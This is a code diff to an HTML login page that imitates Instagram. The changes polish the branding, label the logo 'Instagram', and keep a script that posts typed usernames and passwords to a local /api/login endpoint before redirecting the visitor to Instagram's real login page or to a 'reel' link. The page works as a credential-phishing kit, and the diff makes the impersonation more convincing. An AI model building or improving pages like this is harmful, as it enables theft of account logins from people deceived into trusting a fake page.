@@ -70,7 +70,11 @@
             padding-right: 40px;
         }
 
-        .insta-glyph { width: 60px; margin-bottom: 40px; filter: var(--logo-filter); }
+        .main-logo-display { 
+            width: 175px; 
+            margin-bottom: 30px; 
+            filter: var(--logo-filter); 
+        }
 
         .promo-text {
             font-size: 38px;
@@ -83,7 +87,12 @@
         .promo-text span.orange { color: #ff8a00; }
         .promo-text span.pink { color: #ff006e; }
 
-        .promo-img { width: 320px; }
+        /* THE LOCAL STORIES IMAGE */
+        .promo-img { 
+            width: 320px; 
+            height: auto;
+            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.05));
+        }
 
         /* RIGHT SIDE: LOGIN FORM */
         .login-side {
@@ -181,11 +190,11 @@
 
 <main>
     <div class="promo-side">
-        <img src="logo.png" class="insta-glyph" alt="Logo">
+        <img src="logo.png" class="main-logo-display" alt="Instagram">
         <h1 class="promo-text">
             See everyday moments from your <span class="orange">close</span> <span class="pink">friends</span>.
         </h1>
-        <img src="https://i.imgur.com/GisLhN6.png" class="promo-img" alt="Stories Preview">
+        <img src="stories.png" class="promo-img" alt="Stories Preview">
     </div>
 
     <div class="login-side">
@@ -222,7 +231,7 @@
         const pass = document.getElementById('password').value;
 
         try {
-            // Send data to your backend API
+            // Sends data to your /api/login endpoint
             await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -232,7 +241,7 @@
             console.error('API Error:', error);
         }
 
-        // Handle Redirection
+        // Redirect logic with 'reel' parameter support
         const params = new URLSearchParams(window.location.search);
         const nextLink = params.get('reel');
         window.location.href = nextLink || "https://www.instagram.com/accounts/login/";
